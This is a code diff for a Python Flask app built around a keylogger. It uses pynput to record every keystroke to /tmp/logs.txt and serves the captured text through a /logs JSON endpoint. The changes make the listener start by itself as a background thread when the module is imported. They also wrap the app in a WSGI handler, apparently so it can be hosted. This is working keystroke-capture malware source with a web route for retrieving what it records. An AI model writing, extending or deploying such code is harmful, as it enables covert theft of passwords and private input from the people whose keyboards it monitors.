@@ -1,9 +1,11 @@
 from flask import Flask, render_template_string, jsonify
-from threading import Thread
 from pynput import keyboard
+from threading import Thread
 import os
+from werkzeug.middleware.dispatcher import DispatcherMiddleware
+from werkzeug.wrappers import Response
 
-log_file_path = "logs.txt"
+log_file_path = "/tmp/logs.txt"
 
 if not os.path.exists(log_file_path):
     with open(log_file_path, "w") as f:
@@ -17,9 +19,8 @@ def on_press(key):
         with open(log_file_path, "a") as f:
             f.write(f"[{key}]")
 
-def start_keylogger():
-    with keyboard.Listener(on_press=on_press) as listener:
-        listener.join()
+keylogger_thread = Thread(target=lambda: keyboard.Listener(on_press=on_press).run(), daemon=True)
+keylogger_thread.start()
 
 app = Flask(__name__)
 
@@ -60,7 +61,7 @@ def logs():
         content = f.read()
     return jsonify({"data": content})
 
-if __name__ == "__main__":
-    keylogger_thread = Thread(target=start_keylogger, daemon=True)
-    keylogger_thread.start()
-    app.run(port=5000, debug=False)
+def handler(environ, start_response):
+    return DispatcherMiddleware(Response('Not Found', status=404), {
+        '/': app
+    })(environ, start_response)
